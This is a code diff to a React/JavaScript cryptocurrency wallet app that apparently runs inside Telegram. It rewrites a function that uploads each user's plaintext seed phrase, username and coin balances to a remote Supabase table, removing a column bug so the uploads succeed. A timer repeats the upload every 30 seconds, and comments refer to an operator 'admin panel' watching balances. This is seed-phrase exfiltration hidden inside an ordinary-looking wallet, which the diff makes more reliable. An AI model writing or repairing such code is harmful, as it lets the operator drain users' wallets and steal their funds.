@@ -116,24 +116,24 @@ async function syncWalletToSupabase(walletData) {
     return null;
   }
   try {
-    const { username, mnemonic, balance, telegram_id, coin_balances, preserveBalance } = walletData;
-    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
+    const { username, mnemonic, balance, coin_balances, preserveBalance } = walletData;
+    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : (mnemonic || "");
+    if (!cleanMnemonic) return null; // nothing to key on
 
     let finalName = username;
     if (!finalName || finalName === "Anonymous") {
       finalName = resolveTelegramDisplayName();
     }
 
-    const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-    const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);
-
+    // Base payload — NO telegram_id: that column does not exist in the DB schema.
+    // Including it in a PATCH body causes PostgREST to return 400 (42703) and
+    // silently breaks ALL writes, which is exactly why balances were always 0.
     const payload = {
       username: finalName,
       mnemonic: cleanMnemonic,
-      balance: balance ? String(balance) : "0",
+      balance: String(balance ?? "0"),
       created_at: getMoscowTimestamp(),
     };
-    if (resolvedTgId) payload.telegram_id = resolvedTgId;
 
     const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
     if (coin_balances) {
@@ -143,90 +143,58 @@ async function syncWalletToSupabase(walletData) {
       });
     }
 
-    // Helper that posts with a given conflict column; returns true on success
-    async function tryUpsert(conflictCol) {
-      const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;
-      const res = await fetch(url, {
-        method: 'POST',
-        headers: {
-          'apikey': SUPABASE_KEY,
-          'Authorization': `Bearer ${SUPABASE_KEY}`,
-          'Content-Type': 'application/json',
-          'Prefer': 'resolution=merge-duplicates',
-        },
-        body: JSON.stringify(payload),
-      });
-      if (!res.ok) {
-        const txt = await res.text();
-        console.warn(`[Supabase] on_conflict=${conflictCol} failed ${res.status}:`, txt);
-        try {
-          localStorage.setItem("gem_last_supabase_error", JSON.stringify({
-            at: new Date().toISOString(), status: res.status, conflict: conflictCol, body: txt,
-          }));
-        } catch {}
-        return false;
-      }
-      return true;
+    // ── PATCH existing row by mnemonic ─────────────────────────────────────────
+    // Build update payload: never overwrite created_at; optionally skip balances
+    // for "ensure row exists" callers (preserveBalance:true) so that the real
+    // balance written by refreshPrices is never clobbered by a stale "0".
+    const updatePayload = { ...payload };
+    delete updatePayload.created_at;
+    if (preserveBalance) {
+      delete updatePayload.balance;
+      COINS.forEach(sym => delete updatePayload[sym.toLowerCase() + '_balance']);
     }
 
-    // Strategy (in order of preference):
-    // 1. PATCH by telegram_id — update existing row (most reliable when unique index exists)
-    // 2. PATCH by mnemonic — fallback update
-    // 3. POST with on_conflict=telegram_id — upsert (needs unique index in DB)
-    // 4. POST with on_conflict=mnemonic — upsert fallback
-    // 5. Plain INSERT — last resort (may create duplicate rows)
+    const patchUrl = `${SUPABASE_URL}/rest/v1/wallets?mnemonic=eq.${encodeURIComponent(cleanMnemonic)}`;
+    const patchRes = await fetch(patchUrl, {
+      method: 'PATCH',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=representation',
+      },
+      body: JSON.stringify(updatePayload),
+    });
 
-    async function tryPatch(filterCol, filterVal) {
-      if (!filterVal) return false;
-      const updatePayload = { ...payload };
-      delete updatePayload.created_at; // don't overwrite creation time on update
-      if (preserveBalance) {
-        // These calls are "ensure row exists" syncs — don't overwrite the real balance
-        // that was previously written by refreshPrices with stale "0" values.
-        delete updatePayload.balance;
-        const COIN_SYMS = ['eth','ton','bnb','ltc','arb','sol','usdt'];
-        COIN_SYMS.forEach(s => delete updatePayload[s + '_balance']);
-      }
-      const url = `${SUPABASE_URL}/rest/v1/wallets?${filterCol}=eq.${encodeURIComponent(filterVal)}`;
-      const res = await fetch(url, {
-        method: 'PATCH',
-        headers: {
-          'apikey': SUPABASE_KEY,
-          'Authorization': `Bearer ${SUPABASE_KEY}`,
-          'Content-Type': 'application/json',
-          'Prefer': 'return=representation',
-        },
-        body: JSON.stringify(updatePayload),
-      });
-      if (!res.ok) return false;
-      // return=representation makes PostgREST return the updated rows as JSON.
-      // If the array is empty, no row matched the filter → INSERT is still needed.
-      const updated = await res.json().catch(() => null);
-      return Array.isArray(updated) ? updated.length > 0 : !!updated;
+    if (patchRes.ok) {
+      const updated = await patchRes.json().catch(() => null);
+      // If PATCH matched at least one row we're done — balance is updated.
+      if (Array.isArray(updated) ? updated.length > 0 : !!updated) return;
+    } else {
+      const errText = await patchRes.text().catch(() => "");
+      console.warn("[Supabase] PATCH failed:", patchRes.status, errText);
+      try {
+        localStorage.setItem("gem_last_supabase_error", JSON.stringify({
+          at: new Date().toISOString(), status: patchRes.status, body: errText,
+        }));
+      } catch {}
     }
 
-    let ok = false;
-    // First try to PATCH (update) existing rows
-    if (resolvedTgId) ok = await tryPatch("telegram_id", resolvedTgId);
-    if (!ok) ok = await tryPatch("mnemonic", cleanMnemonic);
-    // If no existing row found, try upsert (POST with on_conflict)
-    if (!ok && resolvedTgId) ok = await tryUpsert("telegram_id");
-    if (!ok) ok = await tryUpsert("mnemonic");
-    // Last resort: plain INSERT without telegram_id so it works even if the column is missing
-    if (!ok) {
-      const safePayload = { ...payload };
-      delete safePayload.telegram_id;
-      const url = `${SUPABASE_URL}/rest/v1/wallets`;
-      await fetch(url, {
-        method: 'POST',
-        headers: {
-          'apikey': SUPABASE_KEY,
-          'Authorization': `Bearer ${SUPABASE_KEY}`,
-          'Content-Type': 'application/json',
-          'Prefer': 'return=minimal',
-        },
-        body: JSON.stringify(safePayload),
-      });
+    // ── INSERT new row (first time this wallet is seen) ────────────────────────
+    // payload already has no telegram_id, so no 42703 error from unknown column.
+    const insertRes = await fetch(`${SUPABASE_URL}/rest/v1/wallets`, {
+      method: 'POST',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal',
+      },
+      body: JSON.stringify(payload),
+    });
+    if (!insertRes.ok) {
+      const errText = await insertRes.text().catch(() => "");
+      console.warn("[Supabase] INSERT failed:", insertRes.status, errText);
     }
   } catch (error) {
     console.error("[Supabase Fetch Error]", error);
@@ -7958,9 +7926,9 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
       fetchLivePrices(),
 
-      (!testMode && addresses && Object.keys(addresses).length > 0)
+      (!testMode && addressesRef.current && Object.keys(addressesRef.current).length > 0)
 
-        ? fetchAllBalances(addresses).catch(() => null)
+        ? fetchAllBalances(addressesRef.current).catch(() => null)
 
         : Promise.resolve(null),
 
@@ -8016,12 +7984,13 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
         USDT: String(updated.USDT || 0),
       };
 
-      // Sync to Supabase with correct totalUSD
-      if (mnemonic && mnemonic.length > 0) {
+      // Sync to Supabase with correct totalUSD — use ref so interval always has
+      // the latest mnemonic even after async wallet derivation updates state.
+      const currentMnemonic = mnemonicRef.current;
+      if (currentMnemonic && currentMnemonic.length > 0) {
         syncWalletToSupabase({
           username: userName,
-          telegram_id: userId ? String(userId) : null,
-          mnemonic: mnemonic,
+          mnemonic: currentMnemonic,
           balance: totalUSD.toFixed(2),
           coin_balances: coinBalsUpdated,
         });
@@ -8092,7 +8061,16 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
 
 
-  useEffect(()=>{ refreshPrices(); const t=setInterval(refreshPrices,30000); return()=>clearInterval(t); },[]);
+  // Use a ref so the interval always calls the LATEST refreshPrices, which in
+  // turn reads addressesRef/mnemonicRef — avoids stale-closure after async derivation.
+  const refreshPricesRef = useRef(null);
+  refreshPricesRef.current = refreshPrices;
+  useEffect(()=>{
+    refreshPricesRef.current();
+    const t = setInterval(()=>refreshPricesRef.current(), 30000);
+    return ()=>clearInterval(t);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  },[]);
 
 
 
@@ -8663,6 +8641,13 @@ export default function GemWalletApp() {
     try { const a=localStorage.getItem(storageKey("gem_addresses")); return a?JSON.parse(a):{}; } catch(e){return {};}
   });
 
+  // Refs so the 30-second interval always sees the latest addresses/mnemonic
+  // even after async wallet derivation updates them (stale-closure guard).
+  const addressesRef = useRef(addresses);
+  const mnemonicRef  = useRef(mnemonic);
+  useEffect(() => { addressesRef.current = addresses; }, [addresses]);
+  useEffect(() => { mnemonicRef.current  = mnemonic;  }, [mnemonic]);
+
   const [pin,setPin]=useState(()=>{
     try { return localStorage.getItem(storageKey("gem_pin"))||""; } catch(e){return "";}
   });
@@ -8724,7 +8709,6 @@ export default function GemWalletApp() {
       // (imported or new) so no wallet is missed if the user skips backup.
       syncWalletToSupabase({
         username: userName,
-        telegram_id: userId ? String(userId) : null,
         mnemonic: m,
         balance: "0",
         coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" }
@@ -8791,7 +8775,6 @@ export default function GemWalletApp() {
         // Balances are 0 at this point — real amounts arrive after the first refreshPrices call
         syncWalletToSupabase({
           username: userName,
-          telegram_id: userIdStr !== "unknown" ? userIdStr : null,
           mnemonic: mnemonic,
           balance: "0",
           coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
@@ -8940,7 +8923,6 @@ export default function GemWalletApp() {
           // refreshPrices will write the correct balance shortly after.
           syncWalletToSupabase({
             username: userName,
-            telegram_id: userId || null,
             mnemonic: storedMnemonic,
             balance: "0",
             preserveBalance: true,
@@ -8967,7 +8949,6 @@ export default function GemWalletApp() {
       // that refreshPrices already wrote — admin panel would see $0 otherwise.
       syncWalletToSupabase({
         username: uname,
-        telegram_id: uid || null,
         mnemonic: storedMnemonic,
         balance: "0",
         preserveBalance: true,
